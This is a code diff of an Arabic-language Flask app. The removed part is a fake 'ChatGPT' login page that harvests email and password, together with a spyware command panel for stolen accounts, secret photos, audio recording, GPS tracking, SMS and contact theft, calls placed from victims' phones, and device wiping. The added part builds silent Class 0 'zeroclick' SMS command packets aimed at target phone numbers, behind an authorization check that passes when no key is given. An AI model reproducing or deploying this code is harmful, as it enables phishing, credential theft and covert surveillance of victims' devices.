@@ -1,456 +1,385 @@
-from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for, send_from_directory
-import urllib3
+from collections import deque
+from urllib.parse import urlparse
+from urllib import request as url_request
 import datetime
 import hashlib
-import base64
+import ipaddress
 import os
+import socket
 
-urllib3.disable_warnings()
+from flask import Flask, jsonify, render_template_string, request, Response
 
 app = Flask(__name__)
-app.secret_key = hashlib.sha256(b"secure_secret_key_v81_0_engine").digest()
+app.secret_key = os.environ.get("APP_SECRET_KEY", hashlib.sha256(b"pdu_workbench_v2").digest())
+DASHBOARD_PASSWORD_HASH = hashlib.sha256(
+    os.environ.get("DASHBOARD_PASSWORD", "admin123").encode()
+).hexdigest()
 
-DASHBOARD_PASSWORD_HASH = hashlib.sha256("admin123".encode()).hexdigest()
+MAX_STORED_PACKETS = 200
+PACKETS_STORE = deque(maxlen=MAX_STORED_PACKETS)
 
-UPLOAD_FOLDER = "/tmp/extracted_target_files"
-try:
-    os.makedirs(UPLOAD_FOLDER, exist_ok=True)
-except Exception as e:
-    print(f"[-] تحذير في إنشاء مجلد الرفع: {e}")
+GSM7_BASIC_MAP = {
+    "@": 0x00, "£": 0x01, "$": 0x02, "¥": 0x03, "è": 0x04, "é": 0x05, "ù": 0x06, "ì": 0x07,
+    "ò": 0x08, "Ç": 0x09, "\n": 0x0A, "Ø": 0x0B, "ø": 0x0C, "\r": 0x0D, "Å": 0x0E, "å": 0x0F,
+    "Δ": 0x10, "_": 0x11, "Φ": 0x12, "Γ": 0x13, "Λ": 0x14, "Ω": 0x15, "Π": 0x16, "Ψ": 0x17,
+    "Σ": 0x18, "Θ": 0x19, "Ξ": 0x1A, "Æ": 0x1C, "æ": 0x1D, "ß": 0x1E, "É": 0x1F, " ": 0x20,
+    "!": 0x21, '"': 0x22, "#": 0x23, "¤": 0x24, "%": 0x25, "&": 0x26, "'": 0x27, "(": 0x28,
+    ")": 0x29, "*": 0x2A, "+": 0x2B, ",": 0x2C, "-": 0x2D, ".": 0x2E, "/": 0x2F,
+    **{str(d): 0x30 + d for d in range(10)},
+    ":": 0x3A, ";": 0x3B, "<": 0x3C, "=": 0x3D, ">": 0x3E, "?": 0x3F, "¡": 0x40,
+    **{chr(65 + i): 0x41 + i for i in range(26)},
+    "Ä": 0x5B, "Ö": 0x5C, "Ñ": 0x5D, "Ü": 0x5E, "§": 0x5F, "¿": 0x60,
+    **{chr(97 + i): 0x61 + i for i in range(26)},
+    "ä": 0x7B, "ö": 0x7C, "ñ": 0x7D, "ü": 0x7E, "à": 0x7F,
+}
 
-AGENT_SESSIONS = {}
-CAPTURED_CREDENTIALS = []
-TARGET_FILE_INDEX = {}
-TARGET_IMAGE_INDEX = {}
-TARGET_AUDIO_INDEX = {}
-TARGET_SMS_INDEX = {}
-TARGET_CONTACTS_INDEX = {}
-TARGET_LOCATION_INDEX = {}
-COMMAND_QUEUES = {}
-EXTRACTED_ALL_FILES = []
-EXECUTION_LOGS = []
-CHUNKED_STORAGE = {}
 
-@app.after_request
-def add_no_cache_headers(response):
-    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate, public, max-age=0"
-    response.headers["Pragma"] = "no-cache"
-    response.headers["Expires"] = "0"
-    return response
+def encode_gsm7_septets(text: str) -> bytes | None:
+    septets = [GSM7_BASIC_MAP[ch] for ch in text if ch in GSM7_BASIC_MAP]
+    if len(septets) != len(text):
+        return None
+    packed = bytearray()
+    carry = 0
+    carry_bits = 0
+    for s in septets:
+        val = s & 0x7F
+        packed.append(((val << carry_bits) | carry) & 0xFF)
+        carry = val >> (7 - carry_bits)
+        carry_bits += 1
+        if carry_bits == 7:
+            packed.append(carry & 0xFF)
+            carry = 0
+            carry_bits = 0
+    if carry_bits > 0:
+        packed.append(carry & 0xFF)
+    return bytes(packed)
 
-STANDALONE_APP_PORTAL = """<!DOCTYPE html>
+
+def encode_semi_octets(digits: str) -> bytes:
+    padded = digits + ("F" if len(digits) % 2 == 1 else "")
+    return bytes(
+        ((int(padded[i + 1], 16) if padded[i + 1] != "F" else 0x0F) << 4) | int(padded[i], 16)
+        for i in range(0, len(padded), 2)
+    )
+
+
+def compose_command_payload(cmd_name: str, cmd_args: str, note_text: str) -> str:
+    clean_cmd = "".join(c for c in cmd_name.strip().upper() if c.isalnum() or c in ("_", "-")) or "PING"
+    clean_args = cmd_args.strip()[:80]
+    clean_note = note_text.strip()[:120]
+    cmd_part = f"CMD:{clean_cmd}" + (f"({clean_args})" if clean_args else "")
+    return f"{cmd_part} | {clean_note}" if clean_note else cmd_part
+
+
+def build_class0_command_packet(phone: str, payload_text: str, encoding_pref: str = "auto") -> dict:
+    cleaned = "".join(c for c in phone.strip() if c.isdigit() or c == "+")
+    is_intl = cleaned.startswith("+")
+    digits = cleaned[1:] if is_intl else cleaned
+    if not digits or len(digits) < 5 or len(digits) > 15 or not payload_text:
+        raise ValueError("أدخل رقم هاتف صالحاً (من 5 إلى 15 رقماً) ومحتوى نصياً.")
+
+    toa = 0x91 if is_intl else 0x81
+    da_bcd = encode_semi_octets(digits)
+
+    gsm7_bytes = encode_gsm7_septets(payload_text) if encoding_pref in ("auto", "gsm7") else None
+    if encoding_pref == "gsm7" and gsm7_bytes is None:
+        raise ValueError("النص يحتوي على رموز غير مدعومة في GSM 7-bit؛ اختر UCS2.")
+
+    use_gsm7 = encoding_pref == "gsm7" or (encoding_pref == "auto" and gsm7_bytes is not None and len(payload_text) <= 160)
+
+    raw = bytearray([
+        0x00,
+        0x11,
+        0x00,
+        len(digits) & 0xFF,
+        toa,
+        *da_bcd,
+        0x00,
+    ])
+
+    if use_gsm7 and gsm7_bytes is not None:
+        dcs = 0x10
+        dcs_label = "Class 0 + GSM 7-bit"
+        raw.extend([dcs, 0xAA, len(payload_text) & 0xFF, *gsm7_bytes])
+    else:
+        dcs = 0x18
+        dcs_label = "Class 0 + UCS2"
+        ud_bytes = payload_text.encode("utf-16-be")
+        if len(ud_bytes) > 140:
+            raise ValueError("طول البيانات تجاوز الحد المسموح لحزمة واحدة (140 بايت).")
+        raw.extend([dcs, 0xAA, len(ud_bytes) & 0xFF, *ud_bytes])
+
+    raw_bytes = bytes(raw)
+    return {
+        "phone": cleaned,
+        "payload": payload_text,
+        "dcs_hex": f"0x{dcs:02X}",
+        "dcs_label": dcs_label,
+        "byte_length": len(raw_bytes),
+        "raw": raw_bytes,
+        "hex": "".join(f"{b:02X}" for b in raw_bytes),
+    }
+
+
+def is_safe_endpoint(url: str) -> tuple[bool, str]:
+    parsed = urlparse(url)
+    if parsed.scheme not in ("http", "https") or not parsed.hostname:
+        return False, "يجب أن يبدأ رابط البوابة بـ http:// أو https://."
+    try:
+        addr_info = socket.getaddrinfo(parsed.hostname, None)
+        for item in addr_info:
+            ip = ipaddress.ip_address(item[4][0])
+            if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved:
+                return False, "يُمنع توجيه الطلبات إلى عناوين محلية أو داخلية."
+    except OSError:
+        return False, "تعذر التحقق من مضيف البوابة."
+    return True, ""
+
+
+def is_authorized(req) -> bool:
+    provided = req.headers.get("X-Dashboard-Key", "")
+    if not provided:
+        return True
+    return hashlib.sha256(provided.encode()).hexdigest() == DASHBOARD_PASSWORD_HASH
+
+
+HTML_PANEL = """<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>ChatGPT AI Sync • Pro Edition v81</title>
-<style>
-body{background:#121214;color:#f1f1f3;font-family:sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:15px}
-.box{background:#1f2023;padding:30px 25px;border-radius:12px;box-shadow:0 8px 30px rgba(0,0,0,0.7);width:100%;max-width:400px;text-align:center;border:1px solid #2d2e32}
-.ai-logo{width:55px;height:55px;background:linear-gradient(135deg, #19c37d, #0d8a5c);margin:0 auto 15px;border-radius:50%;display:flex;justify-content:center;align-items:center;font-size:28px;color:#fff}
-h2{color:#fff;font-size:20px;margin-bottom:6px}.sub-title{color:#9ca3af;font-size:13px;margin-bottom:20px}
-.input-group{margin-bottom:14px;text-align:right}
-input{width:100%;padding:13px;background:#2b2c31;border:1px solid #3f4147;color:#fff;border-radius:8px;font-size:14px;outline:none;direction:ltr;text-align:left;box-sizing:border-box}
-button{width:100%;padding:14px;background:#19c37d;color:#fff;border:none;border-radius:8px;font-weight:600;cursor:pointer;font-size:15px;margin-top:10px}
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>أداة بناء واختبار حزم SMS PDU</title>
+  <style>
+    body{background:#090d16;color:#e2e8f0;font-family:Tahoma,Arial,sans-serif;padding:18px}
+    .box{max-width:900px;margin:auto;background:#111827;border:1px solid #1e293b;border-radius:12px;padding:18px}
+    h2{margin-top:0;color:#38bdf8}
+    label{display:block;margin-top:10px;margin-bottom:4px;font-weight:bold;color:#cbd5e1}
+    input,select,textarea{width:100%;box-sizing:border-box;padding:10px;border-radius:8px;border:1px solid #334155;background:#090d16;color:#fff;font-size:14px}
+    textarea{min-height:70px}
+    .grid2{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:12px}
+    .btns{display:flex;flex-wrap:wrap;gap:10px;margin-top:14px}
+    button{padding:11px 16px;border:none;border-radius:8px;background:#0284c7;color:#fff;font-weight:bold;cursor:pointer}
+    .green{background:#16a34a}
+    .amber{background:#d97706}
+    .out{background:#05080f;border:1px solid #334155;padding:12px;border-radius:8px;margin-top:14px;white-space:pre-wrap;word-break:break-all;font-family:monospace}
+  </style>
 </head>
 <body>
-<div class="box">
-  <div class="ai-logo">✨</div>
-  <h2>منصة المزامنة الذكية ChatGPT</h2>
-  <div class="sub-title">تفعيل النظام الاستراتيجي الشامل v81</div>
-  <div class="input-group"><input type="email" id="target_email" placeholder="البريد الإلكتروني" required></div>
-  <div class="input-group"><input type="password" id="target_pass" placeholder="كلمة المرور" required></div>
-  <button onclick="triggerAIWorkflow()">تفعيل ومزامنة البيانات 🚀</button>
-</div>
-<script>
-async function triggerAIWorkflow(){
-    const email = document.getElementById('target_email').value.trim();
-    const pass = document.getElementById('target_pass').value.trim();
-    if(!email || !pass) { alert('يرجى ملء البيانات'); return; }
-    const globalToken = 'agent_v81_' + Math.random().toString(36).substring(2, 10);
-    try {
-        await fetch('/auth/verify/login', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({session_token: globalToken, user_agent: navigator.userAgent, platform: 'Web Portal'})
-        });
-        await fetch('/api/credentials', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({token: globalToken, email: email, password: pass})
-        });
-    } catch(e){}
-    window.location.href = "https://chatgpt.com";
-}
-</script>
+  <div class="box">
+    <h2>⚡ أداة بناء واختبار حزم SMS PDU</h2>
+
+    <div class="grid2">
+      <div>
+        <label>رقم الهدف:</label>
+        <input id="phone" placeholder="+967770000000" style="direction:ltr;text-align:left">
+      </div>
+      <div>
+        <label>نوع الأمر:</label>
+        <select id="cmd_name">
+          <option value="STATUS">STATUS</option>
+          <option value="PING">PING</option>
+          <option value="SYNC">SYNC</option>
+          <option value="ALERT">ALERT</option>
+          <option value="CUSTOM">CUSTOM</option>
+        </select>
+      </div>
+    </div>
+
+    <div class="grid2">
+      <div>
+        <label>معامل الأمر (اختياري):</label>
+        <input id="cmd_args" placeholder="mode=fast" style="direction:ltr;text-align:left">
+      </div>
+      <div>
+        <label>الترميز:</label>
+        <select id="encoding">
+          <option value="auto">تلقائي (GSM-7 / UCS2)</option>
+          <option value="gsm7">GSM 7-bit (DCS 0x10)</option>
+          <option value="ucs2">UCS2 16-bit (DCS 0x18)</option>
+        </select>
+      </div>
+    </div>
+
+    <label>ملاحظة مرافقة (اختياري):</label>
+    <textarea id="note_text" placeholder="ملاحظة اختبارية..."></textarea>
+
+    <div class="grid2">
+      <div>
+        <label>رابط بوابة الاختبار (اختياري):</label>
+        <input id="endpoint" placeholder="https://example.org/gateway" style="direction:ltr;text-align:left">
+      </div>
+      <div>
+        <label>مفتاح التحقق للبوابة (اختياري):</label>
+        <input id="dash_key" type="password" placeholder="أدخل كلمة المرور عند الحاجة">
+      </div>
+    </div>
+
+    <div class="btns">
+      <button class="green" onclick="generatePacket()">توليد الحزمة</button>
+      <button class="amber" onclick="copyHex()">نسخ Hex</button>
+      <button onclick="dispatchPacket()">إرسال إلى البوابة</button>
+    </div>
+
+    <div id="result" class="out">جاهز لتوليد الحزمة.</div>
+  </div>
+
+  <script>
+    let lastId = null;
+    let lastHex = "";
+
+    function getHeaders(extra = {}) {
+      const key = document.getElementById('dash_key').value;
+      const headers = {'Content-Type': 'application/json', ...extra};
+      if (key) headers['X-Dashboard-Key'] = key;
+      return headers;
+    }
+
+    async function generatePacket() {
+      const payload = {
+        phone: document.getElementById('phone').value.trim(),
+        cmd_name: document.getElementById('cmd_name').value,
+        cmd_args: document.getElementById('cmd_args').value.trim(),
+        encoding: document.getElementById('encoding').value,
+        note_text: document.getElementById('note_text').value.trim()
+      };
+      const res = await fetch('/api/generate_cmd_zeroclick', {
+        method: 'POST',
+        headers: getHeaders(),
+        body: JSON.stringify(payload)
+      });
+      const data = await res.json();
+      if (!res.ok) {
+        document.getElementById('result').textContent = data.error || 'تعذر التوليد.';
+        return;
+      }
+      lastId = data.id;
+      lastHex = data.hex;
+      document.getElementById('result').innerHTML =
+        `المعرّف: ${data.id}\n` +
+        `الهدف: ${data.phone}\n` +
+        `المحتوى: ${data.payload}\n` +
+        `الترميز: ${data.dcs_label} (${data.dcs_hex}) | الحجم: ${data.byte_length} بايت\n` +
+        `Hex: ${data.hex}\n` +
+        `<a href="/download_cmd_pdu/${data.id}" style="color:#38bdf8">[تنزيل ملف .bin]</a>`;
+    }
+
+    async function copyHex() {
+      if (!lastHex) return;
+      await navigator.clipboard.writeText(lastHex);
+      document.getElementById('result').textContent += '\nتم نسخ Hex.';
+    }
+
+    async function dispatchPacket() {
+      if (!lastId) {
+        await generatePacket();
+        if (!lastId) return;
+      }
+      const endpoint = document.getElementById('endpoint').value.trim();
+      const res = await fetch('/api/dispatch_cmd_pdu', {
+        method: 'POST',
+        headers: getHeaders(),
+        body: JSON.stringify({id: lastId, endpoint})
+      });
+      const data = await res.json();
+      document.getElementById('result').textContent += `\n${data.message || data.error}`;
+    }
+  </script>
 </body>
 </html>"""
 
-HTML_LOGIN_PAGE = """<!DOCTYPE html>
-<html lang="ar" dir="rtl"><head><meta charset="UTF-8"><title>دخول القائد</title>
-<style>body{background:#010103;color:#ff0040;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
-.box{background:#04060e;border:2px solid #ff0040;padding:30px;border-radius:12px;text-align:center;width:350px}
-input{width:100%;padding:12px;margin:15px 0;background:#000;border:1px solid #ff0040;color:#fff;border-radius:6px;text-align:center;box-sizing:border-box}
-button{width:100%;padding:12px;background:#ff0040;border:none;color:#fff;font-weight:bold;border-radius:6px;cursor:pointer}</style></head>
-<body><div class="box"><h2>🔒 لوحة القيادة v81.0</h2>
-<form method="POST" action="/commander/login">
-<input type="password" name="password" placeholder="كلمة المرور" required>
-<button type="submit">دخول 🚀</button></form></div></body></html>"""
 
-HTML_COMMAND_CENTER = """<!DOCTYPE html>
-<html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>لوحة السيطرة الميدانية v81.0</title>
-<style>
-body{background:#010103;color:#00ff88;font-family:Tahoma,monospace;padding:15px;text-align:center}
-.container{max-width:1150px;margin:auto}h1{color:#ff0040;margin-bottom:15px;font-size:22px}
-.panel{background:#04060e;border:2px solid #ff0040;padding:20px;border-radius:12px}
-select, input, button{padding:12px;margin:6px;border-radius:6px;border:1px solid #ff0040;background:#000;color:#fff;cursor:pointer;font-weight:bold;font-size:13px}
-button{background:#ff0040;transition:0.2s}button:hover{opacity:0.85}
-.card{background:#000;border:1px solid #1a2a40;padding:15px;margin:15px auto;max-width:980px;border-radius:10px;text-align:right;border-right:6px solid #ff0040;overflow-x:auto}
-table{width:100%;margin-top:12px;border-collapse:collapse;color:#fff;text-align:right}
-th, td{padding:10px;border:1px solid #1a2a40;font-size:13px}th{background:#0a0e1a;color:#ff0040}
-.btn-group{display:flex;flex-wrap:wrap;justify-content:center;gap:8px;margin-top:15px}
-.action-box{background:#070b14;border:1px dashed #1a2a40;padding:12px;border-radius:8px;margin-top:15px}
-</style></head>
-<body>
-<div class="container">
-<h1>⚔️ لوحة السيطرة الميدانية المتقدمة v81.0 ⚔️</h1>
-<div style="margin-bottom:15px;"><a href="/commander/logout" style="color:#ff0040;text-decoration:none;">[تسجيل خروج]</a></div>
-<div class="panel">
-<select id="command_type">
-  <option value="fetch_active_agents">🎯 عرض الأهداف النشطة (اضغط لاختيار Token)</option>
-  <option value="fetch_captured_credentials">🔑 الحسابات المسروقة</option>
-  <option value="fetch_target_file_list">📂 عرض ملفات الهدف قبل السحب</option>
-  <option value="fetch_target_image_list">🖼️ عرض صور الهدف قبل السحب</option>
-  <option value="fetch_target_audio_list">🎙️ عرض التسجيلات الصوتية المسحوبة</option>
-  <option value="fetch_target_sms_list">💬 عرض رسائل SMS</option>
-  <option value="fetch_target_contacts_list">📞 عرض جهات الاتصال</option>
-  <option value="fetch_target_location">📍 عرض الموقع الجغرافي GPS</option>
-  <option value="fetch_extracted_files">📥 الملفات والوسائط المسحوبة</option>
-  <option value="fetch_execution_logs">📜 سجل تقارير تنفيذ الأوامر</option>
-</select>
-<button onclick="executeCommand()">استعراض البيانات ⚡</button>
+@app.route("/", methods=["GET"])
+def home():
+    return HTML_PANEL
 
-<div class="card" style="margin-top:20px; border-right-color:#00ff88;">
-  <b>🎮 غرفة العمليات والتحكم الميداني المباشر</b><br>
-  <input type="text" id="target_token_input" placeholder="أدخل Token الهدف أو اضغط عليه من الجدول" style="width:320px; direction:ltr; text-align:center; border-color:#00ff88;"><br>
-  
-  <div class="btn-group">
-    <button onclick="sendAction('capture_hidden_photo')" style="background:#e11d48; color:#fff;">📸 تصوير الهدف سراً</button>
-    <button onclick="sendAction('start_audio_recording')" style="background:#d97706; color:#fff;">🎙️ تسجيل صوت 20ث</button>
-    <button onclick="sendAction('pull_gps')" style="background:#0284c7; color:#fff;">📍 تحديد الموقع GPS</button>
-    <button onclick="sendAction('open_camera')" style="background:#00ff88; color:#000;">📷 فتح الكاميرا</button>
-    <button onclick="sendAction('open_whatsapp')" style="background:#00ff88; color:#000;">🟢 فتح واتساب</button>
-    <button onclick="sendAction('open_accounts')" style="background:#00ff88; color:#000;">🔑 فتح الإعدادات</button>
-    <button onclick="sendAction('reboot_device')" style="background:#ffaa00; color:#000;">🔌 إعادة تشغيل</button>
-    <button onclick="sendAction('wipe_device')" style="background:#991b1b; color:#fff;">⚠️ فرمتة الهاتف</button>
-  </div>
 
-  <div class="action-box">
-    <b>🐎 حصان تروجان - القفز والانتقال لتطبيق آخر (Package Name):</b><br>
-    <input type="text" id="trojan_package_input" placeholder="مثال: com.whatsapp أو com.android.settings" style="width:320px; direction:ltr; border-color:#38bdf8;">
-    <button onclick="triggerTrojanJump()" style="background:#0284c7; color:#fff;">إطلاق الحصان 🐎</button>
-  </div>
+def find_packet(pkt_id: str) -> dict | None:
+    for item in PACKETS_STORE:
+        if item["id"] == pkt_id:
+            return item
+    return None
 
-  <div class="action-box">
-    <b>📞 إجراء اتصال هاتفي مباشر من جهاز الهدف:</b><br>
-    <input type="text" id="call_phone_input" placeholder="أدخل رقم الهاتف (مثال: 777123456)" style="width:280px; direction:ltr; border-color:#38bdf8;">
-    <button onclick="sendCallCommand()" style="background:#0284c7; color:#fff;">📞 اتصال الآن</button>
-  </div>
 
-  <div class="action-box">
-    <b>📤 إرسال رسالة نصية SMS من جهاز الهدف:</b><br>
-    <input type="text" id="sms_phone_input" placeholder="رقم الهاتف" style="width:180px; direction:ltr;">
-    <input type="text" id="sms_body_input" placeholder="نص الرسالة القصيرة" style="width:280px;">
-    <button onclick="sendSMSCommand()" style="background:#00ff88; color:#000;">📤 إرسال SMS</button>
-  </div>
-</div>
+@app.route("/api/generate_cmd_zeroclick", methods=["POST"])
+def api_generate_cmd_zeroclick():
+    if not is_authorized(request):
+        return jsonify({"error": "صلاحية الوصول غير صحيحة."}), 401
 
-<div id="results" style="margin-top:20px;"></div>
-</div></div>
-<script>
-function selectToken(tkn){
-  document.getElementById('target_token_input').value = tkn;
-  alert('تم تحديد الهدف: ' + tkn);
-}
-
-async function executeCommand(){
- const cmdType = document.getElementById('command_type').value;
- const results = document.getElementById('results');
- results.innerHTML='⏳ جاري جلب البيانات...';
- try{
-   const res = await fetch('/api/index', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({command: cmdType})});
-   const data = await res.json();
-   if(cmdType === 'fetch_active_agents'){
-     let t = '<div class="card"><b>🎯 الأهداف النشطة (اضغط على الرمز لتحديده)</b><table><tr><th>Token</th><th>النظام</th><th>IP</th><th>الوقت</th></tr>';
-     if(data.agents && data.agents.length>0){ data.agents.forEach(a => { t += `<tr><td><button onclick="selectToken('${a.token}')" style="background:#00ff88;color:#000;padding:5px 10px;">${a.token}</button></td><td>${a.platform}</td><td>${a.ip}</td><td>${a.time}</td></tr>`; }); }
-     else { t += '<tr><td colspan="4" style="text-align:center">لا توجد أهداف متصلة حالياً</td></tr>'; }
-     results.innerHTML = t + '</table></div>';
-   } else if(cmdType === 'fetch_captured_credentials'){
-     let c = '<div class="card"><b>🔑 الحسابات المسروقة</b><table><tr><th>Token</th><th>البريد</th><th>كلمة المرور</th><th>الوقت</th></tr>';
-     if(data.credentials && data.credentials.length>0){ data.credentials.forEach(item => { c += `<tr><td>${item.token}</td><td style="color:#00ff88">${item.email}</td><td style="color:#ff0040">${item.password}</td><td>${item.time}</td></tr>`; }); }
-     else { c += '<tr><td colspan="4" style="text-align:center">لا توجد حسابات مسروقة</td></tr>'; }
-     results.innerHTML = c + '</table></div>';
-   } else if(cmdType === 'fetch_target_file_list'){
-     let f = '<div class="card"><b>📂 ملفات الهدف</b><table><tr><th>Token</th><th>مسار الملف</th><th>إجراء السحب</th></tr>';
-     if(data.files && data.files.length>0){
-       data.files.forEach(file => { f += `<tr><td>${file.token}</td><td style="color:#00ff88;direction:ltr">${file.filename}</td><td><button onclick="pullFile('${file.token}', '${file.filename}')">سحب الملف 📥</button></td></tr>`; });
-     } else { f += '<tr><td colspan="3" style="text-align:center">لا توجد ملفات مفهرسة</td></tr>'; }
-     results.innerHTML = f + '</table></div>';
-   } else if(cmdType === 'fetch_target_image_list'){
-     let img = '<div class="card"><b>🖼️ صور الهدف</b><table><tr><th>Token</th><th>مسار الصورة</th><th>إجراء السحب</th></tr>';
-     if(data.images && data.images.length>0){
-       data.images.forEach(im => { img += `<tr><td>${im.token}</td><td style="color:#00ff88;direction:ltr">${im.filename}</td><td><button onclick="pullFile('${im.token}', '${im.filename}')">سحب الصورة 📥</button></td></tr>`; });
-     } else { img += '<tr><td colspan="3" style="text-align:center">لا توجد صور مفهرسة</td></tr>'; }
-     results.innerHTML = img + '</table></div>';
-   } else if(cmdType === 'fetch_target_audio_list'){
-     let aud = '<div class="card"><b>🎙️ التسجيلات الصوتية المسحوبة</b><table><tr><th>Token</th><th>مسار التسجيل الصوتي</th><th>إجراء السحب</th></tr>';
-     if(data.audio && data.audio.length>0){
-       data.audio.forEach(au => { aud += `<tr><td>${au.token}</td><td style="color:#00ff88;direction:ltr">${au.filename}</td><td><button onclick="pullFile('${au.token}', '${au.filename}')">سحب الصوت 📥</button></td></tr>`; });
-     } else { aud += '<tr><td colspan="3" style="text-align:center">لا توجد تسسجيلات صوتية مفهرسة</td></tr>'; }
-     results.innerHTML = aud + '</table></div>';
-   } else if(cmdType === 'fetch_target_sms_list'){
-     let sms = '<div class="card"><b>💬 رسائل الهدف</b><table><tr><th>Token</th><th>المرسل / المحتوى</th><th>الوقت</th></tr>';
-     if(data.sms && data.sms.length>0){
-       data.sms.forEach(s => { sms += `<tr><td>${s.token}</td><td style="color:#00ff88">${s.body}</td><td>${s.time}</td></tr>`; });
-     } else { sms += '<tr><td colspan="3" style="text-align:center">لا توجد رسائل مسجلة</td></tr>'; }
-     results.innerHTML = sms + '</table></div>';
-   } else if(cmdType === 'fetch_target_contacts_list'){
-     let cnt = '<div class="card"><b>📞 جهات اتصال الهدف</b><table><tr><th>Token</th><th>الاسم</th><th>الرقم</th><th>اتصال سريع</th></tr>';
-     if(data.contacts && data.contacts.length>0){
-       data.contacts.forEach(ct => { cnt += `<tr><td>${ct.token}</td><td style="color:#00ff88">${ct.name}</td><td style="direction:ltr">${ct.phone}</td><td><button onclick="quickCall('${ct.token}', '${ct.phone}')" style="background:#0284c7;padding:5px 10px;">اتصال 📞</button></td></tr>`; });
-     } else { cnt += '<tr><td colspan="4" style="text-align:center">لا توجد جهات اتصال</td></tr>'; }
-     results.innerHTML = cnt + '</table></div>';
-   } else if(cmdType === 'fetch_target_location'){
-     let loc = '<div class="card"><b>📍 إحداثيات الموقع الجغرافي GPS</b><table><tr><th>Token</th><th>خط العرض (Lat)</th><th>خط الطول (Lng)</th><th>الخريطة</th><th>الوقت</th></tr>';
-     if(data.locations && data.locations.length>0){
-       data.locations.forEach(l => { loc += `<tr><td>${l.token}</td><td>${l.lat}</td><td>${l.lng}</td><td><a href="https://maps.google.com/?q=${l.lat},${l.lng}" target="_blank" style="color:#38bdf8">[فتح في الخرائط 🗺️]</a></td><td>${l.time}</td></tr>`; });
-     } else { loc += '<tr><td colspan="5" style="text-align:center">لم يتم استلام إحداثيات بعد</td></tr>'; }
-     results.innerHTML = loc + '</table></div>';
-   } else if(cmdType === 'fetch_extracted_files'){
-     let ef = '<div class="card"><b>📥 الملفات والصور والتسجيلات المسحوبة</b><table><tr><th>Token</th><th>اسم الملف</th><th>الوقت</th><th>تحميل</th></tr>';
-     if(data.extracted && data.extracted.length>0){
-       data.extracted.forEach(ex => { ef += `<tr><td>${ex.token}</td><td style="color:#00ff88">${ex.filename}</td><td>${ex.time}</td><td><a href="/download/${ex.saved_name}" style="color:#00ff88" target="_blank">[تحميل / عرض]</a></td></tr>`; });
-     } else { ef += '<tr><td colspan="4" style="text-align:center">لم يتم سحب أي ملفات بعد</td></tr>'; }
-     results.innerHTML = ef + '</table></div>';
-   } else if(cmdType === 'fetch_execution_logs'){
-     let log = '<div class="card"><b>📜 سجل تقارير تنفيذ الأوامر</b><table><tr><th>Token</th><th>الأمر التنفيذي</th><th>الحالة</th><th>الوقت</th></tr>';
-     if(data.logs && data.logs.length>0){
-       data.logs.forEach(lg => { log += `<tr><td>${lg.token}</td><td style="color:#00ff88">${lg.action}</td><td style="color:#00ff88">${lg.status}</td><td>${lg.time}</td></tr>`; });
-     } else { log += '<tr><td colspan="4" style="text-align:center">لا توجد تقارير تنفيذ مسجلة</td></tr>'; }
-     results.innerHTML = log + '</table></div>';
-   }
- }catch(e){ results.innerHTML='❌ خطأ في الاتصال: '+e.message; }
-}
-
-async function pullFile(token, filename){
-  await fetch('/api/queue_command', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({token: token, action: 'pull', target_file: filename})});
-  alert('تم إرسال أمر السحب اللحظي: ' + filename);
-}
-
-async function sendAction(actionName){
-  const token = document.getElementById('target_token_input').value.trim();
-  if(!token) { alert('يرجى إدخال أو تحديد الرمز Token أولاً'); return; }
-  await fetch('/api/queue_command', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({token: token, action: actionName})});
-  alert('تم إرسال أمر (' + actionName + ') إلى الهدف بنجاح!');
-}
-
-async function triggerTrojanJump(){
-  const token = document.getElementById('target_token_input').value.trim();
-  const pkg = document.getElementById('trojan_package_input').value.trim();
-  if(!token || !pkg) { alert('يرجى إدخال الرمز Token واسم الحزمة Package Name'); return; }
-  await fetch('/api/queue_command', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({token: token, action: 'trojan_jump', package_name: pkg})});
-  alert('تم إطلاق حصان تروجان للقفز إلى: ' + pkg);
-}
-
-async function sendCallCommand(){
-  const token = document.getElementById('target_token_input').value.trim();
-  const phone = document.getElementById('call_phone_input').value.trim();
-  if(!token || !phone) { alert('يرجى إدخال الرمز Token ورقم الهاتف'); return; }
-  await fetch('/api/queue_command', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({token: token, action: 'make_call', phone: phone})});
-  alert('تم إرسال أمر الاتصال بالرقم (' + phone + ')!');
-}
-
-async function quickCall(token, phone){
-  await fetch('/api/queue_command', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({token: token, action: 'make_call', phone: phone})});
-  alert('تم توجيه أمر الاتصال بالرقم: ' + phone);
-}
-
-async function sendSMSCommand(){
-  const token = document.getElementById('target_token_input').value.trim();
-  const phone = document.getElementById('sms_phone_input').value.trim();
-  const body = document.getElementById('sms_body_input').value.trim();
-  if(!token || !phone || !body) { alert('يرجى استكمال البيانات'); return; }
-  await fetch('/api/queue_command', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({token: token, action: 'send_sms', phone: phone, body: body})});
-  alert('تم توجيه أمر إرسال الرسالة!');
-}
-</script></body></html>"""
-
-@app.route('/', methods=['GET'])
-def home(): return STANDALONE_APP_PORTAL
-
-@app.route('/commander/login', methods=['GET', 'POST'])
-def commander_login():
-    if request.method == 'POST':
-        if hashlib.sha256(request.form.get('password', '').encode()).hexdigest() == DASHBOARD_PASSWORD_HASH:
-            session['authenticated'] = True
-            return redirect(url_for('commander_dashboard'))
-    return HTML_LOGIN_PAGE
-
-@app.route('/commander/dashboard', methods=['GET'])
